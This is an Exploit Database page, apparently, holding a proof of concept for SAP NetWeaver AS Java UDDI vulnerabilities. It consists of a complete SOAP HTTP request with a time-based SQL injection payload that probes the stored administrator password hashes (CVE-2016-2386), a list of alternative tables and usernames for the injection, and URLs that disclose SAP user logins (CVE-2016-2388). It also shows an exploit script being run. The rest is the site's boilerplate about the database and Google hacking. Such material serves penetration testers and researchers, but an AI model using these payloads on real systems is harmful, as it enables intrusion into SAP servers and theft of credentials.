Bugs:
CVE-2016-2386 SQL injection
CVE-2016-2388 Information disclosure
CVE-2016-1910 Crypto issue

Follow HTTP request is a simple PoC for anon time-based SQL injection (CVE-2016-2386) vulnerability in SAP NetWeaver AS Java UDDI 7.11-7.50

    POST /UDDISecurityService/UDDISecurityImplBean HTTP/1.1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
	SOAPAction:
	Content-Type: text/xml;charset=UTF-8
	Host: nw74:50000
	Content-Length: 500

	<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:sec="http://sap.com/esi/uddi/ejb/security/">
	  <soapenv:Header/>
	  <soapenv:Body>
		<sec:deletePermissionById>
		  <permissionId>1' AND 1=(select COUNT(*) from J2EE_CONFIGENTRY, UME_STRINGS where UME_STRINGS.PID like '%PRIVATE_DATASOURCE.un:Administrator%' and UME_STRINGS.VAL like '%SHA-512%') AND '1'='1</permissionId>
		</sec:deletePermissionById>
	  </soapenv:Body>
	</soapenv:Envelope>

In SAP test server I have admin user who login is "Administrator" and so I used this payload

        %PRIVATE_DATASOURCE.un:Administrator%

most SAP's using j2ee_admin username for SAP administrator login

        %PRIVATE_DATASOURCE.un:j2ee_admin%

You can get all SAP users login using these URLs (CVE-2016-2388 - information disclosure)

	1)	http:/SAP_IP:SAP_PORT/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat#
	2)	http:/SAP_IP:SAP_PORT/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Messages#

Instead of J2EE_CONFIGENTRY table you can use this tables

        UME_STRINGS_PERM
        UME_STRINGS_ACTN
        BC_DDDBDP
        BC_COMPVERS
        TC_WDRR_MRO_LUT
        TC_WDRR_MRO_FILES
        T_CHUNK                !!! very big table, if SAP server will not response during 20 seconds then you have SQL injection
        T_DOMAIN
        T_SESSION
        UME_ACL_SUP_PERM
        UME_ACL_PERM
        UME_ACL_PERM_MEM

An example of a working exploit

	C:\Python27\python.exe SQL_injection_CVE-2016-2386.py --host nw74 --port 50000
	start to retrieve data from the table UMS_STRINGS from nw74 server using CVE-2016-2386 exploit
	this may take a few minutes

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
